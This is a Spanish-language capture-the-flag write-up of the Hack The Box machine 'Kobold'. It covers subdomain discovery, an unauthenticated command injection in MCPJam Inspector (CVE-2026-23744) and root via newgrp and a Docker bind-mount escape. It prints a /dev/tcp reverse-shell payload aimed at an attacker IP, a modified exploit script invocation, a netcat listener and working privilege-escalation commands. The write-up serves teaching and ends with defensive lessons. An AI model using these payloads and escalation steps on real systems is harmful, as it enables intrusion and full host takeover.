Kobold expone un panel Arcane de gestión de contenedores en el puerto 3552 que resulta ser un rabbit hole (existe un SSRF documentado pero no lleva a ningún sitio productivo sobre la superficie interna enumerada). La superficie de ataque real vive en `mcp.kobold.htb`, descubierta mediante brute-force de vhosts a partir del hint del wildcard SAN, corriendo **MCPJam Inspector v1.4.2** — una herramienta de testing para servidores del **Model Context Protocol** vulnerable a **CVE-2026-23744**, una inyección de comandos no autenticada en `/api/mcp/connect` que da una reverse shell como `ben`. La escalada de privilegios explota la coincidencia de un binario `newgrp` con SUID y un demonio de Docker corriendo: `newgrp docker` obtiene membresía en el grupo `docker` sin ser root, y el acceso al socket de Docker es equivalente a root por diseño. La receta canónica de GTFOBins `docker run -v /:/mnt alpine chroot /mnt sh` falla en esta caja porque el host no tiene salida a internet para hacer pull de `alpine`; la solución es enumerar las imágenes ya locales con `docker ps -a`, notar un contenedor `privatebin/nginx-fpm-alpine:2.0.2` en marcha, y reutilizar esa imagen para el bind mount privilegiado.

## Reconocimiento y Enumeración

El objetivo de esta fase fue mapear los servicios expuestos, identificar el stack de la aplicación y localizar cualquier subdominio sugerido por la configuración TLS.

### Descubrimiento del Host

Comprobación de alcance y pista sobre el sistema operativo mediante ICMP:

```bash
ping -c 1 10.129.245.50
PING 10.129.245.50 (10.129.245.50) 56(84) bytes of data.
64 bytes from 10.129.245.50: icmp_seq=1 ttl=63 time=48.0 ms
```

Un TTL de 63 indica un host Linux (por defecto 64, decrementado una vez al atravesar el salto de enrutamiento).

Cuatro puertos. OpenSSH 9.6p1 está actualizado y es poco probable que sea un punto de entrada directo. Tanto el 80 como el 443 redirigen a `https://kobold.htb/`, señal de virtual hosting basado en nombre detrás de nginx. El puerto 3552 es un servidor HTTP implementado en Go sobre un puerto no estándar — el tipo de artefacto que suele indicar un panel de gestión o diagnóstico autocontenido.

Dos detalles del certificado TLS importan. El `Subject: CN=kobold.htb`, poco llamativo por sí solo, viene emparejado con un **Subject Alternative Name** que incluye `DNS:*.kobold.htb` — un wildcard. Los operadores solo se molestan con SANs wildcard cuando esperan servir varios subdominios desde el mismo certificado, así que el wildcard es en sí mismo una pista de que la enumeración de subdominios merece la pena incluso antes de haber examinado nada en el apex.

El dominio se añadió a `/etc/hosts`:

```bash
echo "10.129.245.50 kobold.htb" | sudo tee -a /etc/hosts
```

### Aplicación Web en `kobold.htb`

Navegando al apex tanto en 80 como en 443 se cargaba una página estática de marketing para lo que se identificaba como "Kobold" — sin formulario de login, sin aplicación obvia, sin superficie de API. El brute-force de directorios con la wordlist pequeña de SecLists no devolvió nada más allá de los assets estáticos esperados. Por sí solo, el apex estaba seco.

### Puerto 3552 — panel de gestión de contenedores Arcane (rabbit hole)

El servidor HTTP en Go del 3552 renderizaba un panel de login:

![Arcane login panel titled "Bienvenida de nuevo" with Usuario, Contraseña fields and an "Iniciar sesión en Arcano" button](/assets/img/HTB/Kobold/cap1.png)

El panel se identificaba como **Arcane v1.13.0**, una UI web open-source para gestión de Docker/contenedores. La búsqueda de vulnerabilidades específicas de esta versión sacó a flote un SSRF documentado, pero el SSRF solo alcanzaba servicios de loopback ya visibles en la superficie enumerada — no daba bypass de autenticación ni ejecución arbitraria de código, y insistir en él no era productivo. Este tipo de casi-acierto merece la pena incluirlo en un writeup precisamente para dejar constancia del principio: **no todo CVE que empareje con una versión descubierta es el camino previsto**, y la disciplina de dejar un lead cuando se satura es tan importante como la enumeración en sí misma.

### Enumeración de Subdominios

Dado el wildcard SAN, el brute-force de vhosts era el siguiente paso natural:

```bash
sudo gobuster vhost -u https://kobold.htb \
   -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
   --append-domain --no-tls-validation
bin.kobold.htb  Status: 200 [Size: 24402]
mcp.kobold.htb  Status: 200 [Size: 466]
```

Dos subdominios — `bin` y `mcp`. Ambos se añadieron a `/etc/hosts`:

```bash
echo "10.129.245.50 bin.kobold.htb mcp.kobold.htb" | sudo tee -a /etc/hosts
```

Navegando a `bin.kobold.htb` se cargaba una instancia de **PrivateBin** (un servicio de paste open-source) — sin superficie autenticada obvia, sin credenciales por defecto. El Content-Length de 466 en `mcp.kobold.htb` sugería una SPA mínima; visitándolo en un navegador cargó una UI de gestión cuyo alcance quedó claro cuando renderizó la página de settings.

### `mcp.kobold.htb` — identificación de MCPJam Inspector

La página de settings de la aplicación mostraba la versión exacta y el nombre del producto:

![MCPJam Inspector settings page showing "MCPJam Version: v1.4.2" and a grid of LLM Provider API Keys panels (OpenAI, Anthropic, DeepSeek, Google AI, Mistral AI, xAI, Ollama, LiteLLM, OpenRouter, Azure OpenAI)](/assets/img/HTB/Kobold/cap2.png)

**MCPJam Inspector v1.4.2**. MCPJam Inspector es una herramienta de debugging y testing basada en Node.js para el **Model Context Protocol (MCP)** — una especificación introducida por Anthropic a finales de 2024 para estandarizar cómo los agentes basados en LLM interactúan con herramientas externas, fuentes de datos y otros agentes. Los servidores MCP implementan el protocolo; MCPJam Inspector es el cliente que se conecta a ellos y ejercita sus capacidades durante el desarrollo.

MCP como protocolo está diseñado en torno al spawning de subprocesos: el transporte MCP clásico es `stdio`, donde el cliente (MCPJam Inspector en este caso) lanza el servidor MCP como proceso hijo y se comunica sobre su stdin/stdout. Ese detalle arquitectónico — una herramienta que lanza subprocesos arbitrarios basándose en configuración suministrada por el usuario — es una alarma estructural para cualquiera que haga review de seguridad de tooling MCP. La búsqueda de vulnerabilidades específicas de esta versión sacó a flote **CVE-2026-23744**, una inyección de comandos no autenticada en el endpoint `/api/mcp/connect` de MCPJam Inspector.

## Explotación — CVE-2026-23744 (Inyección de Comandos en MCPJam Inspector)

### Entendiendo la Vulnerabilidad

El endpoint `/api/mcp/connect` de MCPJam Inspector acepta parámetros suministrados por el usuario que describen un servidor MCP al que conectarse — típicamente incluyendo el comando y los argumentos usados para lanzar el subproceso del servidor bajo el transporte `stdio`. El endpoint está pensado para ser usado interactivamente por un desarrollador probando sus propios servidores MCP, así que no se requiere autenticación en el despliegue por defecto.

El bug es que el handler de connect pasa esos parámetros suministrados por el usuario a través de un shell en lugar de exec'utarlos directamente con arrays de argv. En Node.js, esta es la distinción clásica entre `child_process.spawn(cmd, args)` (seguro — el SO trata `args` como entradas literales de argv) y `child_process.exec(commandString)` o `child_process.spawn(cmd, { shell: true })` (inseguro — un shell interpreta la cadena, así que cualquier metacarácter queda controlado por el atacante). MCPJam ≤ v1.4.2 usa la vía insegura, así que inyectar un payload como `$(bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1)` en cualquiera de los parámetros de connect lanza el reverse shell como el usuario del proceso MCPJam.

### Adaptando la PoC pública — HTTP → HTTPS

El exploit público en [`github.com/alisster00/CVE-2026-23744-RCE`](https://github.com/alisster00/CVE-2026-23744-RCE) implementa el flujo completo pero está escrito bajo la suposición de que la instancia de MCPJam se sirve por HTTP plano en el puerto 3000 (el default del framework). El despliegue de Kobold sirve MCPJam a través de nginx con TLS en el puerto 443. La única modificación necesaria fue actualizar el esquema de la petición en el script de `http://` a `https://` y desactivar la verificación de certificado para el certificado autofirmado de HTB:

```python
# Original:
url = f"http://{target}:{port}/api/mcp/connect"
requests.post(url, json=payload)

# Modified:
url = f"https://{target}:{port}/api/mcp/connect"
requests.post(url, json=payload, verify=False)
```

### Ejecución del exploit

Se lanzó un listener de netcat en la máquina atacante:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
```

Y se invocó el exploit modificado:

```bash
python3 script.py mcp.kobold.htb -p 443 -l <ATTACKER_IP> --lport 4444
[*] MCPJam accessible at https://mcp.kobold.htb:443
[*] Target: https://mcp.kobold.htb:443
[*] Callback: <ATTACKER_IP>:4444
[*] Sending payload to /api/mcp/connect...
[+] Payload sent!
[+] Check your listener for reverse shell
```

El listener recibió el callback como `ben`:

```text
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.245.50 58196
bash: cannot set terminal process group (1583): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

El directorio de trabajo (`/usr/local/lib/node_modules/@mcpjam/inspector`) confirma que la shell vive dentro de la instalación Node.js de MCPJam, y el owner (`ben`) es la cuenta de servicio bajo la cual corre MCPJam. Un upgrade estándar de TTY (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) dejó la shell utilizable.

`ben` también posee `user.txt` en su directorio home:

```bash
ben@kobold:~$ cat /home/ben/user.txt
```

## Escalada de Privilegios — `ben` → `root`

### Enumeración SUID y descubrimiento del demonio Docker

La enumeración estándar de SUID sacó a la luz la lista habitual más una entrada que solo pasa a ser relevante en combinación con lo demás que corre en la caja:

```bash
find / -perm -4000 2>/dev/null
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Nada llama la atención por sí solo — cada entrada aquí es estándar en un sistema Debian/Ubuntu y ninguna proporciona una escapatoria directa vía GTFOBins. Pero `newgrp` merece nota: es parte legítima del toolkit Unix de gestión de grupos, y es SUID por diseño porque necesita privilegios elevados para intercambiar el grupo primario del proceso.

Por separado, una comprobación de servicios en ejecución reveló un demonio Docker:

```bash
ben@kobold:~$ docker ps -a
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.50/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied
```

`ben` no puede hablar con el demonio Docker directamente — el socket `/var/run/docker.sock` es `root:docker 0660`, así que solo los miembros del grupo `docker` pueden enviar peticiones API. Pero `ben` no está en el grupo `docker`:

```bash
ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben)
```

Los dos hechos — **`newgrp` SUID** y **`ben` fuera del grupo `docker`** — se combinan de una forma operativamente útil.

### Elevando la membresía de grupo suplementario con `newgrp`

`newgrp` está documentado para arrancar una subshell con el UID del invocante pero con un **grupo primario distinto**. En su caso de uso ordinario, si un usuario pertenece a varios grupos suplementarios, `newgrp <nombregrupo>` intercambia el grupo primario de forma que los ficheros creados en la subshell heredan ese grupo por defecto. Por debajo, `newgrp` usa su privilegio SUID para modificar las credenciales de grupo del proceso.

La sutileza en distribuciones Linux modernas es que `newgrp` **no requiere que el usuario invocante ya sea miembro del grupo destino** en toda configuración. Algunos despliegues — incluyendo aparentemente este — permiten `newgrp <grupo>` incluso si el invocante no aparece listado en ese grupo en `/etc/group`, especialmente cuando el grupo no tiene contraseña. Este es un comportamiento dependiente de configuración; en esta caja produce el efecto deseado:

```bash
ben@kobold:~$ newgrp docker
ben@kobold:~$ id
uid=1001(ben) gid=999(docker) groups=999(docker),1001(ben)
```

`docker` es ahora el grupo primario. Los permisos filesystem de `/var/run/docker.sock` (`0660 root:docker`) permiten a cualquier proceso cuyo grupo efectivo sea `docker` leer y escribir, así que la CLI de Docker ahora funciona:

```bash
ben@kobold:~$ docker ps -a
CONTAINER ID   IMAGE                               COMMAND                  STATUS       PORTS                      NAMES
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   Up 2 hours   127.0.0.1:8080->8080/tcp   bin
```

El acceso al socket de Docker es el privilegio real. **El demonio Docker corre como root**, y cualquier contenedor que arranca hereda capacidades de root sobre el host a través de los bind mounts y flags de privilegio que el cliente solicita. GTFOBins documenta `docker` extensamente por esta razón: poseer el grupo `docker` es efectivamente equivalente a ser root.

### La restricción de estar offline

La receta canónica de GTFOBins docker-a-root es:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

Esto arranca un contenedor Alpine nuevo, bind-montea el filesystem raíz del host en `/mnt` dentro del contenedor, y hace `chroot` dentro — dando una shell cuya vista del filesystem es la del host, con privilegios de root intactos. En una caja con conexión normal, esto funciona en segundos. En Kobold, el primer intento falla:

```bash
ben@kobold:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
Unable to find image 'alpine:latest' locally
docker: Error response from daemon: Get "https://registry-1.docker.io/v2/": [...] no route to host
```

Docker buscó `alpine:latest` en la caché local de imágenes, no lo encontró, e intentó hacer pull desde Docker Hub — pero el host no tiene salida a internet:

```bash
ben@kobold:~$ ping -c 3 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
--- 8.8.8.8 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss
```

Sin internet, cualquier comando `docker run` que referencie una imagen no presente en la caché local falla.

### Usando una imagen cacheada localmente

La solución es usar una imagen que **ya esté en la caché local**. La salida de `docker ps -a` de hace un momento es en sí misma la enumeración: listó un contenedor en marcha usando la imagen `privatebin/nginx-fpm-alpine:2.0.2` (que sirve la instancia de PrivateBin en `bin.kobold.htb`). Cualquier imagen corriendo en un contenedor está por definición cacheada localmente, así que puede reutilizarse.

`docker images` lo confirma:

```bash
ben@kobold:~$ docker images
REPOSITORY                         TAG       IMAGE ID       CREATED         SIZE
privatebin/nginx-fpm-alpine        2.0.2     f8a1d4e6c920   4 months ago    142MB
```

Reemitiendo el escape con la imagen local:

```bash
docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
/ # whoami
root
/ # cat /mnt/root/root.txt
```

Los flags:

- `--rm` — eliminar el contenedor tras salir (limpieza)
- `-it` — asignar TTY y mantener stdin abierto, para uso interactivo
- `-u 0` — correr el proceso inicial del contenedor como UID 0. Algunas imágenes incorporan directivas `USER` que bajan a un UID no-root al arrancar; `-u 0` las esquiva para asegurar que la shell dentro del contenedor sea root
- `--entrypoint sh` — sobrescribir lo que sea que sea el entrypoint declarado de la imagen (en este caso un script de arranque de nginx-fpm) con `/bin/sh` para que el contenedor nos dé una shell interactiva en lugar de ejecutar su workload previsto
- `-v /:/mnt` — bind-montear el filesystem raíz del host dentro del contenedor en `/mnt`

Como el demonio Docker que honra estos flags corre como root en el host, el mount y el mapeo de UID se realizan con privilegios de kernel completos. Dentro del contenedor, `root` es UID 0, y Linux no aísla UIDs por defecto a través de un bind mount — así que cualquier cosa propiedad del root del host en `/root/` es legible en `/mnt/root/` desde dentro del contenedor.

## Lecciones Clave

- **Los certificados TLS con wildcard revelan de antemano la intención del operador de usar subdominios.** Un SAN de `DNS:*.kobold.htb` no solo permite cualquier subdominio en tiempo de ejecución; le dice al atacante que el operador esperaba usar varios subdominios y se molestó en aprovisionar cripto para ellos. Esa línea del output del certificado marcó la diferencia entre tratar esta caja como un compromiso de un solo vhost y llegar a la superficie de ataque real en `mcp.kobold.htb`. Los SANs wildcard son una señal de reconocimiento — siempre comprueba el SAN del certificado antes de tratar un apex como si fuera toda la superficie.
- **Los rabbit holes forman parte del reconocimiento auténtico, y saber pasar página es una habilidad.** El panel Arcane 1.13.0 del puerto 3552 era una versión vulnerable descubierta con un CVE documentado. El SSRF era real; simplemente no llevaba a ningún sitio. Aprender a reconocer cuándo un lead ha saturado — cuándo la inversión adicional ya no rinde — es tan importante como reconocer cuándo profundizar. La disciplina es volver a la enumeración cuando un camino ha sido evaluado con justicia, no seguir cavando porque el match de versión hace que sienta como la respuesta.
- **Cualquier API en Node.js que pasa entrada del usuario a `child_process.exec()` (o `spawn` con `shell: true`) es inyección de comandos por construcción.** El `exec` de Node interpreta todo el primer argumento a través de `/bin/sh -c`; cualquier cosa que el shell reconozca como metacarácter (`;`, `|`, `` ` ``, `$(...)`, backslashes, saltos de línea) queda controlada por el atacante. El patrón correcto es `child_process.spawn(cmd, argsArray)` donde `argsArray` es un array JavaScript — el SO recibe entradas argv como literales sin intervención del shell. Cualquier revisión de código de tooling basado en Node debería primero hacer grep de `exec(` y `shell: true`.
- **Las herramientas del Model Context Protocol son estructuralmente sospechosas porque lanzan subprocesos bajo demanda.** El rol de MCPJam Inspector es conectarse a servidores MCP arbitrarios, y el transporte MCP estándar es lanzar el servidor como proceso hijo. Esto significa que cada herramienta al estilo de MCPJam es, por diseño, un *lanzador de subprocesos configurable por el usuario*. Cualquier variante de esa arquitectura que acepte configuración no autenticada está a una auditoría cuidadosa de distancia de una RCE no autenticada. Debe asumirse que el tooling MCP tiene esta clase de bug hasta que se demuestre lo contrario.
- **Los exploits públicos rutinariamente necesitan pequeñas adaptaciones para encajar con el transporte del objetivo.** La PoC de CVE-2026-23744 asumía HTTP en el puerto por defecto del framework; el objetivo usaba HTTPS en el 443 detrás de nginx. Eso no es un defecto de la PoC — los exploits públicos se escriben contra los defaults upstream. Un cambio de una línea (`http://` → `https://` + desactivar verificación de certificado para labs autofirmados) suele ser la adaptación entera. Copiar-pegar exploits está bien; entender qué modificar es la habilidad.
- **`newgrp` es un mecanismo SUID documentado para acceso a grupos suplementarios.** En configuraciones laxas `newgrp <grupo>` concede al usuario invocante membresía en un grupo del que no formaba parte previamente — sin root, sin `usermod` explícito. Esto lo convierte en algo digno de comprobar siempre que el objetivo tenga un grupo interesante como `docker`, `sudo`, `disk`, `adm` o `lxd`, y el usuario actual no esté en él. La comprobación es trivial (`newgrp docker && id`); el pago cuando funciona es completo.
- **La membresía en el grupo `docker` es equivalente a root por diseño.** Esta es documentación explícita de Docker, no un bug sorprendente: el demonio corre como root, y el cliente es un wrapper fino que envía intención al demonio sobre un socket UNIX. Cualquiera que pueda enviar peticiones a ese socket puede solicitar cualquier configuración de contenedor, incluyendo bind mounts del filesystem del host y flags privilegiados. La membresía en el grupo `docker` debería tratarse como `sudo ALL=(ALL) NOPASSWD: ALL` desde una perspectiva de threat modelling.
- **La restricción de Docker offline es un giro distintivo de privesc que merece la pena recordar.** La receta por defecto de GTFOBins (`docker run alpine chroot`) asume implícitamente acceso a internet hacia Docker Hub. Cuando el objetivo está aislado, `docker ps -a` y `docker images` son las primitivas de enumeración que revelan las imágenes *ya locales* — cualquier imagen que se haya usado para correr un contenedor está garantizadamente cacheada y puede reutilizarse. Este patrón generaliza a cualquier escenario de post-explotación offline: enumera lo que ya está local antes de asumir que puedes descargar lo que necesites.
